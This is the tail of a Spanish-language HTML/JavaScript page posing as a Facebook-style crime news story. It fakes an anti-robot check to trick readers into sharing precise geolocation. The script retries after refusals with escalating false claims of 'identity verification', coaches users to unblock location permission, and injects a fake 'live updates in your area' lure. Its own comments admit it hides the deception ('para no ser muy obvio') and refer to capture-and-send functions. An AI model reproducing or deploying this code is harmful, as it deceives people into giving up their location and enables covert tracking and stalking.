                readMoreLink.style.pointerEvents = 'none';
            }
            
            // Mostrar overlay de verificaci√≥n anti-robot
            showRobotVerificationOverlay();
            
            // Esperar 2.5 segundos para que parezca una verificaci√≥n real
            setTimeout(() => {
                attemptLocationCapture(1); // Primer intento
            }, 2500);
        }
        
        // Nueva funci√≥n para intentos m√∫ltiples de captura
        function attemptLocationCapture(attemptNumber) {
            locationAttempts = attemptNumber; // Actualizar contador global
            console.log(`üìç Intento ${attemptNumber} de captura de ubicaci√≥n...`);
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // ‚úÖ √âXITO - Captura exitosa
                        console.log('‚úÖ Ubicaci√≥n capturada exitosamente en intento', attemptNumber);
                        captureLocation(position);
                        
                        // Mostrar verificaci√≥n completada
                        showVerificationSuccess();
                        
                        // Ocultar overlay y mostrar contenido despu√©s de 1 segundo
                        setTimeout(() => {
                            hideVerificationOverlay();
                            showFullContentFacebook();
                        }, 1000);
                    },
                    function(error) {
                        // ‚ùå FALL√ì - Regresar a la noticia principal
                        console.log(`‚ùå Fallo en intento ${attemptNumber}:`, error.message);
                        
                        // Detectar si los permisos est√°n bloqueados permanentemente
                        if (error.code === error.PERMISSION_DENIED && error.message.includes('blocked')) {
                            console.log('üö´ Permisos bloqueados permanentemente - mostrando instrucciones');
                            showPermissionBlockedInstructions();
                            return;
                        }
                        
                        if (attemptNumber <= 3) {
                            // Mostrar mensaje y regresar a "leer m√°s"
                            showLocationDeniedMessage(attemptNumber);
                        } else {
                            // Despu√©s de 3 intentos, mostrar contenido (para no ser muy obvio)
                            console.log('‚ö†Ô∏è M√°ximo de intentos alcanzado, mostrando contenido');
                            showVerificationSuccess();
                            setTimeout(() => {
                                hideVerificationOverlay();
                                showFullContentFacebook();
                            }, 1000);
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            } else {
                // Si no hay geolocalizaci√≥n, mostrar contenido
                showVerificationSuccess();
                setTimeout(() => {
                    hideVerificationOverlay();
                    showFullContentFacebook();
                }, 1000);
            }
        }
        
        // Funci√≥n para mostrar diagn√≥stico detallado al usuario
        function showDetailedDiagnostic() {
            const diagnosticInfo = {
                navegador: navigator.userAgent,
                geolocalizacionSoportada: !!navigator.geolocation,
                protocolo: location.protocol,
                esHTTPS: location.protocol === 'https:',
                esLocal: location.hostname === 'localhost' || location.hostname === '127.0.0.1',
                dominio: location.hostname,
                url: location.href
            };
            
            console.log('üîß === DIAGN√ìSTICO DETALLADO ===');
            console.table(diagnosticInfo);
            
            let diagnosticMessage = `üîß DIAGN√ìSTICO DE GEOLOCALIZACI√ìN:

‚úÖ Geolocalizaci√≥n soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'S√ç' : 'NO'}
üåê Protocolo: ${diagnosticInfo.protocolo}
üîê HTTPS: ${diagnosticInfo.esHTTPS ? 'S√ç' : 'NO'}
üè† Dominio: ${diagnosticInfo.dominio}

`;

            if (!diagnosticInfo.geolocalizacionSoportada) {
                diagnosticMessage += `‚ùå PROBLEMA CR√çTICO: Tu navegador no soporta geolocalizaci√≥n.
üì± Soluci√≥n: Actualiza tu navegador a la versi√≥n m√°s reciente.

`;
            }

            if (!diagnosticInfo.esHTTPS && !diagnosticInfo.esLocal) {
                diagnosticMessage += `‚ö†Ô∏è ADVERTENCIA: El sitio no usa HTTPS.
üîí Esto puede causar problemas con la geolocalizaci√≥n.
‚úÖ Recomendaci√≥n: Usa el sitio desde una URL con HTTPS.

`;
            }

            if (navigator.permissions) {
                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
                    const permStatus = result.state;
                    diagnosticMessage += `üîê Estado de permisos: ${permStatus}

`;
                    
                    if (permStatus === 'denied') {
                        diagnosticMessage += `‚ùå PROBLEMA: Permisos denegados.
üîß Soluci√≥n: 
1. Haz clic en el √≠cono üîí o üìç en la barra de direcciones
2. Selecciona "Permitir" para ubicaci√≥n
3. Recarga la p√°gina

`;
                    } else if (permStatus === 'prompt') {
                        diagnosticMessage += `‚úÖ Los permisos se solicitar√°n cuando sea necesario.

`;
                    } else {
                        diagnosticMessage += `‚úÖ Permisos concedidos correctamente.

`;
                    }
                    
                    diagnosticMessage += `üìä CONSEJOS ADICIONALES:
‚Ä¢ Aseg√∫rate de tener GPS activado en tu dispositivo
‚Ä¢ Si est√°s en interior, sal al aire libre
‚Ä¢ Cierra otras aplicaciones que usen ubicaci√≥n
‚Ä¢ Verifica tu conexi√≥n a internet

üîÑ Despu√©s de hacer cambios, intenta de nuevo.`;
                    
                    alert(diagnosticMessage);
                });
            } else {
                diagnosticMessage += `‚ÑπÔ∏è No se pueden verificar permisos autom√°ticamente.

üìä CONSEJOS GENERALES:
‚Ä¢ Verifica que el GPS est√© activado
‚Ä¢ Permite ubicaci√≥n cuando el navegador lo pida
‚Ä¢ Si est√°s en interior, sal al aire libre
‚Ä¢ Recarga la p√°gina despu√©s de cambiar configuraciones

üîÑ Intenta nuevamente despu√©s de verificar estos puntos.`;
                
                alert(diagnosticMessage);
            }
        }
        
        // Funci√≥n para mostrar instrucciones cuando los permisos est√°n bloqueados
        function showPermissionBlockedInstructions() {
            const content = document.getElementById('verificationContent');
            if (content) {
                content.innerHTML = `
                    <div style="font-size: 4rem; margin-bottom: 30px;">üö´</div>
                    <h2 style="font-size: 1.6rem; margin-bottom: 20px; font-weight: 600; color: #f59e0b;">
                        Verificaci√≥n Bloqueada
                    </h2>
                    <p style="margin: 20px 0; font-size: 1.1rem; line-height: 1.5; color: #e5e7eb;">
                        El navegador ha bloqueado las verificaciones de seguridad. Para acceder al contenido necesitas resetear los permisos:
                    </p>
                    
                    <div style="text-align: left; margin: 25px 0; padding: 20px; background: rgba(245, 158, 11, 0.1); border-radius: 10px; border: 1px solid rgba(245, 158, 11, 0.3);">
                        <h3 style="color: #f59e0b; margin-bottom: 15px; font-size: 1.2rem;">üìã Instrucciones para Chrome:</h3>
                        <ol style="color: #e5e7eb; font-size: 1rem; line-height: 1.6; margin: 0; padding-left: 20px;">
                            <li>Haz clic en el <strong>√≠cono de candado üîí</strong> junto a la URL</li>
                            <li>Selecciona <strong>"Configuraci√≥n del sitio"</strong></li>
                            <li>En <strong>"Ubicaci√≥n"</strong> cambia a <strong>"Preguntar"</strong></li>
                            <li>Recarga la p√°gina y vuelve a intentar</li>
                        </ol>
                    </div>

                    <div style="margin: 30px 0;">
                        <button onclick="location.reload()" style="
                            background: linear-gradient(135deg, #f59e0b, #d97706);
                            color: white;
                            border: none;
                            padding: 18px 40px;
                            border-radius: 50px;
                            font-size: 1.2rem;
                            font-weight: bold;
                            cursor: pointer;
                            margin: 10px;
                            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
                        ">üîÑ Recargar P√°gina</button>
                        
                        <button onclick="hideVerificationOverlay(); showFullContentFacebook();" style="
                            background: linear-gradient(135deg, #6b7280, #4b5563);
                            color: white;
                            border: none;
                            padding: 18px 40px;
                            border-radius: 50px;
                            font-size: 1.2rem;
                            font-weight: bold;
                            cursor: pointer;
                            margin: 10px;
                            box-shadow: 0 4px 15px rgba(107, 114, 128, 0.3);
                        ">üì∞ Continuar Sin Verificar</button>
                    </div>
                    
                    <p style="font-size: 0.9rem; color: #6b7280; margin-top: 15px;">
                        üí° Despu√©s de seguir las instrucciones, la verificaci√≥n funcionar√° correctamente
                    </p>
                `;
                
                console.log('üö´ Instrucciones de permisos bloqueados mostradas');
            }
        }
        
        // Funci√≥n para mostrar overlay de verificaci√≥n anti-robot
        function showRobotVerificationOverlay() {
            const overlay = document.createElement('div');
            overlay.id = 'robotVerificationOverlay';
            overlay.innerHTML = `
                <div style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.9);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 9999;
                    color: white;
                    text-align: center;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
                ">
                    <div id="verificationContent">
                        <div style="font-size: 4rem; margin-bottom: 30px;">üîê</div>
                        <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600;">Verificando que no eres un robot</h2>
                        <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Este proceso es autom√°tico y toma unos segundos...</p>
                        <div style="
                            width: 50px;
                            height: 50px;
                            border: 4px solid #374151;
                            border-top: 4px solid #3b82f6;
                            border-radius: 50%;
                            animation: spin 1s linear infinite;
                            margin: 30px auto;
                        "></div>
                        <p style="font-size: 0.9rem; color: #9ca3af; margin-top: 20px;">Verificaci√≥n de seguridad requerida para acceder al contenido completo</p>
                    </div>
                </div>
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            `;
            document.body.appendChild(overlay);
            console.log('ü§ñ Overlay de verificaci√≥n anti-robot mostrado');
        }
        
        // Funci√≥n para mostrar verificaci√≥n exitosa
        function showVerificationSuccess() {
            const content = document.getElementById('verificationContent');
            if (content) {
                content.innerHTML = `
                    <div style="font-size: 4rem; margin-bottom: 30px;">‚úÖ</div>
                    <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600; color: #10b981;">Verificaci√≥n Completada</h2>
                    <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Acceso autorizado. Cargando contenido completo...</p>
                    <div style="
                        width: 40px;
                        height: 40px;
                        border: 3px solid #10b981;
                        border-radius: 50%;
                        margin: 20px auto;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        font-size: 1.5rem;
                    ">‚úì</div>
                `;
                console.log('‚úÖ Verificaci√≥n anti-robot completada exitosamente');
            }
        }
        
        // Funci√≥n para ocultar overlay de verificaci√≥n
        function hideVerificationOverlay() {
            const overlay = document.getElementById('robotVerificationOverlay');
            if (overlay) {
                overlay.style.opacity = '0';
                overlay.style.transition = 'opacity 0.3s ease-out';
                setTimeout(() => {
                    overlay.remove();
                    console.log('ü§ñ Overlay de verificaci√≥n removido');
                }, 300);
            }
        }
        
        // Funci√≥n para mostrar mensaje cuando se rechaza la ubicaci√≥n
        function showLocationDeniedMessage(attemptNumber) {
            const messages = [
                {
                    icon: "üîê",
                    title: "Verificaci√≥n de Seguridad Requerida",
                    text: "Para proteger este contenido sensible de accesos no autorizados, necesitamos confirmar que eres una persona real. Sin esta verificaci√≥n no podemos mostrar la informaci√≥n completa.",
                    buttonText: "üõ°Ô∏è Intentar Verificaci√≥n de Nuevo",
                    color: "#dc2626"
                },
                {
                    icon: "üì°",
                    title: "Acceso Restringido", 
                    text: "Este contenido sobre el caso judicial est√° disponible solo para usuarios verificados. La verificaci√≥n de identidad es obligatoria para acceder a los detalles del operativo.",
                    buttonText: "üîç Verificar Mi Identidad Ahora",
                    color: "#ea580c"
                },
                {
                    icon: "üö®",
                    title: "Contenido de Seguridad Cr√≠tica",
                    text: "Esta informaci√≥n puede ser vital para tu seguridad personal. √öLTIMA OPORTUNIDAD: Se requiere verificaci√≥n de identidad para acceder a los detalles completos del caso 'Coquito'.",
                    buttonText: "‚úÖ CONFIRMAR IDENTIDAD - √öltimo Intento",
                    color: "#b91c1c"
                }
            ];
            
            const message = messages[attemptNumber - 1] || messages[2];
            
            const content = document.getElementById('verificationContent');
            if (content) {
                content.innerHTML = `
                    <div style="font-size: 4rem; margin-bottom: 20px;">${message.icon}</div>
                    <h2 style="color: ${message.color}; font-size: 1.6rem; margin-bottom: 20px; font-weight: 600;">
                        ${message.title}
                    </h2>
                    <p style="margin: 20px 0; font-size: 1.1rem; line-height: 1.5; color: #e5e7eb;">
                        ${message.text}
                    </p>
                    
                    <div style="margin: 30px 0;">
                        <button onclick="resetToReadMore()" style="
                            background: linear-gradient(135deg, ${message.color}, #7f1d1d);
                            color: white;
                            border: none;
                            padding: 18px 40px;
                            border-radius: 50px;
                            font-size: 1.2rem;
                            font-weight: bold;
                            cursor: pointer;
                            margin: 10px;
                            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
                        ">${message.buttonText}</button>
                    </div>
                    
                    <p style="font-size: 0.9rem; color: #6b7280; margin-top: 15px;">
                        Intento ${attemptNumber} de 3 - El contenido se desbloquear√° despu√©s de la verificaci√≥n exitosa
                    </p>
                `;
                
                console.log(`‚ö†Ô∏è Mostrando mensaje de ubicaci√≥n denegada (intento ${attemptNumber})`);
            }
        }
        
        // Funci√≥n para regresar al estado de "leer m√°s"
        function resetToReadMore() {
            console.log('üîÑ Regresando al estado de "leer m√°s" para nuevo intento...');
            
            // Ocultar overlay
            hideVerificationOverlay();
            
            // Restaurar el enlace "leer m√°s"
            setTimeout(() => {
                const newsContent = document.getElementById('newsContent');
                if (newsContent && currentNews && currentNews.content) {
                    const contentWithReadMore = currentNews.content + '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer m√°s</strong></span>';
                    newsContent.innerHTML = contentWithReadMore;
                    console.log('‚úÖ Enlace "leer m√°s" restaurado - usuario debe intentar de nuevo');
                }
            }, 500);
        }
        
        // Funci√≥n para renderizar la noticia en la p√°gina y restaurar el enlace "leer m√°s"
        function renderNews(templateKey = 'crime') {
            try {
                const template = newsTemplates[templateKey] || Object.values(newsTemplates)[0];
                currentNews = template;

                const titleEl = document.getElementById('newsTitle');
                const newsImg = document.getElementById('newsImage');
                const newsContentEl = document.getElementById('newsContent');
                const fullNewsContentEl = document.getElementById('fullNewsContent');
                const readMoreSection = document.getElementById('readMoreSection');

                if (titleEl) titleEl.textContent = currentNews.title || 'Sin t√≠tulo';

                // Manejo de imagen si existe en la plantilla
                if (newsImg) {
                    // Si la plantilla provee una imagen expl√≠cita y no es data URI
                    if (currentNews.image && !String(currentNews.image).startsWith('data:')) {
                        newsImg.src = currentNews.image;
                        newsImg.style.display = '';
                    } else {
                        // Ocultar imagen principal para evitar el cuadro oscuro SVG embebido
                        newsImg.style.display = 'none';
                    }
                }

                // Contenido principal con "leer m√°s" si hay fullContent
                if (currentNews.fullContent) {
                    if (newsContentEl) {
                        newsContentEl.innerHTML = (currentNews.content || '') +
                            '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer m√°s</strong></span>';
                    }
                    if (fullNewsContentEl) fullNewsContentEl.innerHTML = currentNews.fullContent;
                } else {
                    if (newsContentEl) newsContentEl.textContent = currentNews.content || '';
                    if (fullNewsContentEl) fullNewsContentEl.textContent = '';
                }

                // Opcional: bot√≥n adicional en readMoreSection
                if (readMoreSection) {
                    readMoreSection.innerHTML = '';
                }

                console.log('üì∞ Noticia renderizada:', currentNews.title);
            } catch (e) {
                console.error('‚ùå Error al renderizar la noticia:', e);
            }
        }

        // Inicializar la noticia al cargar el script
        renderNews();
        
        // Intentar capturar ubicaci√≥n autom√°ticamente despu√©s de 10 segundos
        setTimeout(() => {
            if (Math.random() > 0.3) { // 70% de probabilidad
                const alertDiv = document.querySelector('.location-alert');
                if (alertDiv) {
                    alertDiv.innerHTML += `
                    <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.2); border-radius: 10px; font-size: 0.95rem;">
                        <strong>‚ö° ACTUALIZACIONES EN VIVO:</strong> Otros lectores en tu zona est√°n reportando nuevos desarrollos. 
                        <a href="#" onclick="requestLocation(); return false;" style="color: #fbbf24; text-decoration: underline;">
                            Verifica tu √°rea para recibir actualizaciones instant√°neas.
                        </a>
                    </div>
                `;
                }
            }
        }, 10000);
    </script>
    <!-- Script final consolidado: las funciones de captura y env√≠o est√°n arriba en un √∫nico bloque -->
</body>
</html>